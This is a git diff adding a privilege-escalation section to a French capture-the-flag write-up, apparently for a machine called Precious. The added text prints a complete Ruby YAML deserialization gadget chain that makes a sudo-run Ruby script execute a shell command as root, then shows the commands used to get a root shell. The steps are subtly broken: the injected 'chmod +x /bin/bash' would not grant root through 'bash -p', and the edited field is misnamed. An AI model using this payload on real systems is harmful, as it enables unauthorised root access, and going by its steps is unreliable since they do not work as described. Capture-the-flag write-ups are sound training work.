@@ -97,3 +97,43 @@ Le premier flaf user se trouvait dans le fichier user.txt ! cherchons maintenant
 <figure><img src="../../.gitbook/assets/yaml-precious.png" alt=""><figcaption></figcaption></figure>
 
 Avec un "sudo -l " on s'apercoit que le user Henry a les droit pour lancer un script .yaml qui charge un fichier de dependance via la méthode File.read().
+
+
+
+```yaml
+henry@precious:~$ cat dependencies.yml
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: "chmod +x /bin/bash"
+         method_id: :resolve
+```
+
+en modifiant l'id par "chmod +x /bin/bash" et en executant&#x20;
+
+```
+sudo /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+nous pouvons devenir root !&#x20;
+
+```
+/bin/bash -p
+bash-5.1# ls
+dependencies.yml  user.txt
+bash-5.1# cat user.txt
+```
+
